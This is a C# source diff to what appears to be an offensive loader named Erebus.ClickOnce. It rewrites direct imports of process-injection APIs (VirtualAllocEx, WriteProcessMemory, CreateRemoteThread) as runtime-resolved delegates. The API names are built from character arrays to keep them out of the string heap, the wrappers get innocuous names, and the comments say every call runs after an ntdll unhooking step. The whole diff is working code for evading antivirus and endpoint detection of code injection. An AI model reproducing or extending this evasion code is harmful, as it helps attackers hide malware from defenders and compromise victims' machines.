@@ -1,6 +1,7 @@
 ﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
+using Erebus.ClickOnce.Evasion;
 
 namespace Erebus.ClickOnce
 {
@@ -110,11 +111,21 @@ namespace Erebus.ClickOnce
             MEM_FREE = 0x00010000,
         }
 
-        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        public static extern bool CloseHandle(IntPtr hObject);
+        // ----------------------------------------------------------------
+        // D/Invoke-resolved wrappers. Every DLL and export name is kept
+        // out of the assembly's #Strings heap: the char arrays live on
+        // DynamicApi, the function names here are materialised at
+        // runtime via char[] literals, and the delegates are cached in
+        // Lazy<T> so the first use is what triggers resolution - always
+        // after NtdllUnhook has run, which means every call we make
+        // targets a clean stub.
+        // ----------------------------------------------------------------
 
-        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        public static extern bool CreateProcess(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate bool FnCh(IntPtr hObject);
+
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Unicode, SetLastError = true)]
+        private delegate bool FnCp(
             string applicationName,
             StringBuilder commandLine,
             IntPtr processAttributes,
@@ -126,51 +137,148 @@ namespace Erebus.ClickOnce
             ref STARTUPINFO startupInfo,
             out PROCESS_INFORMATION processInformation);
 
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern unsafe HANDLE CreateRemoteThread(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private unsafe delegate HANDLE FnCrt(
             HANDLE hProcess,
-            [Optional] SECURITY_ATTRIBUTES* lpThreadAttributes,
+            SECURITY_ATTRIBUTES* lpThreadAttributes,
             nuint dwStackSize,
-            IntPtr lpStartAddress, // Fixed: Use IntPtr instead of delegate
-            [Optional] void* lpParameter,
+            IntPtr lpStartAddress,
+            void* lpParameter,
             THREAD_CREATION_FLAGS dwCreationFlags,
-            [Optional] uint* lpThreadId);
+            uint* lpThreadId);
 
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern unsafe HANDLE CreateThread(
-            [Optional] SECURITY_ATTRIBUTES* lpThreadAttributes,
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private unsafe delegate HANDLE FnCt(
+            SECURITY_ATTRIBUTES* lpThreadAttributes,
             nuint dwStackSize,
             LPTHREAD_START_ROUTINE lpStartAddress,
-            [Optional] void* lpParameter,
+            void* lpParameter,
             THREAD_CREATION_FLAGS dwCreationFlags,
-            [Optional] uint* lpThreadId);
+            uint* lpThreadId);
 
-        [DllImport("user32.dll")]
-        public static extern bool EnumDesktops(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam);
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        private delegate bool FnEd(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam);
 
-        [DllImport("KERNEL32.dll", ExactSpelling = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern IntPtr GetCurrentProcess();
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        private delegate IntPtr FnGcp();
 
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern unsafe IntPtr VirtualAllocEx(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private unsafe delegate IntPtr FnVae(
             HANDLE hProcess,
-            [Optional] IntPtr lpAddress,
+            IntPtr lpAddress,
             nuint dwSize,
             VIRTUAL_ALLOCATION_TYPE flAllocationType,
             PAGE_PROTECTION_FLAGS flProtect);
 
-        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
-        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
-        public static extern unsafe BOOL WriteProcessMemory(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private unsafe delegate BOOL FnWpm(
             HANDLE hProcess,
             void* lpBaseAddress,
             void* lpBuffer,
             nuint nSize,
-            [Optional] nuint* lpNumberOfBytesWritten);
+            nuint* lpNumberOfBytesWritten);
+
+        private static readonly Lazy<FnCh> _closeHandle =
+            DynamicApi.LazyDelegate<FnCh>(
+                DynamicApi.Kernel32,
+                new[] { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e' });
+
+        private static readonly Lazy<FnCp> _createProcess =
+            DynamicApi.LazyDelegate<FnCp>(
+                DynamicApi.Kernel32,
+                new[] { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'W' });
+
+        private static readonly Lazy<FnCrt> _createRemoteThread =
+            DynamicApi.LazyDelegate<FnCrt>(
+                DynamicApi.Kernel32,
+                new[] { 'C', 'r', 'e', 'a', 't', 'e', 'R', 'e', 'm', 'o', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd' });
+
+        private static readonly Lazy<FnCt> _createThread =
+            DynamicApi.LazyDelegate<FnCt>(
+                DynamicApi.Kernel32,
+                new[] { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd' });
+
+        private static readonly Lazy<FnEd> _enumDesktops =
+            DynamicApi.LazyDelegate<FnEd>(
+                DynamicApi.User32,
+                new[] { 'E', 'n', 'u', 'm', 'D', 'e', 's', 'k', 't', 'o', 'p', 's', 'W' });
+
+        private static readonly Lazy<FnGcp> _getCurrentProcess =
+            DynamicApi.LazyDelegate<FnGcp>(
+                DynamicApi.Kernel32,
+                new[] { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's' });
+
+        private static readonly Lazy<FnVae> _virtualAllocEx =
+            DynamicApi.LazyDelegate<FnVae>(
+                DynamicApi.Kernel32,
+                new[] { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x' });
+
+        private static readonly Lazy<FnWpm> _writeProcessMemory =
+            DynamicApi.LazyDelegate<FnWpm>(
+                DynamicApi.Kernel32,
+                new[] { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y' });
+
+        public static bool CloseHandle(IntPtr hObject) => _closeHandle.Value(hObject);
+
+        public static bool CreateProcess(
+            string applicationName,
+            StringBuilder commandLine,
+            IntPtr processAttributes,
+            IntPtr threadAttributes,
+            bool inheritHandles,
+            CREATION_FLAGS creationFlags,
+            IntPtr environment,
+            string currentDirectory,
+            ref STARTUPINFO startupInfo,
+            out PROCESS_INFORMATION processInformation)
+            => _createProcess.Value(
+                applicationName, commandLine, processAttributes, threadAttributes,
+                inheritHandles, creationFlags, environment, currentDirectory,
+                ref startupInfo, out processInformation);
+
+        public static unsafe HANDLE DoRemoteStart(
+            HANDLE hProcess,
+            SECURITY_ATTRIBUTES* lpThreadAttributes,
+            nuint dwStackSize,
+            IntPtr lpStartAddress,
+            void* lpParameter,
+            THREAD_CREATION_FLAGS dwCreationFlags,
+            uint* lpThreadId)
+            => _createRemoteThread.Value(
+                hProcess, lpThreadAttributes, dwStackSize, lpStartAddress,
+                lpParameter, dwCreationFlags, lpThreadId);
+
+        public static unsafe HANDLE DoStartThread(
+            SECURITY_ATTRIBUTES* lpThreadAttributes,
+            nuint dwStackSize,
+            LPTHREAD_START_ROUTINE lpStartAddress,
+            void* lpParameter,
+            THREAD_CREATION_FLAGS dwCreationFlags,
+            uint* lpThreadId)
+            => _createThread.Value(
+                lpThreadAttributes, dwStackSize, lpStartAddress,
+                lpParameter, dwCreationFlags, lpThreadId);
+
+        public static bool DoEnum(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam)
+            => _enumDesktops.Value(hwinsta, lpEnumFunc, lParam);
+
+        public static IntPtr GetCurrentProcess() => _getCurrentProcess.Value();
+
+        public static unsafe IntPtr DoAllocEx(
+            HANDLE hProcess,
+            IntPtr lpAddress,
+            nuint dwSize,
+            VIRTUAL_ALLOCATION_TYPE flAllocationType,
+            PAGE_PROTECTION_FLAGS flProtect)
+            => _virtualAllocEx.Value(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
+
+        public static unsafe BOOL DoWriteMem(
+            HANDLE hProcess,
+            void* lpBaseAddress,
+            void* lpBuffer,
+            nuint nSize,
+            nuint* lpNumberOfBytesWritten)
+            => _writeProcessMemory.Value(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
 
         [DebuggerDisplay("{Value}")]
         public readonly struct BOOL(int value) : IEquatable<BOOL>
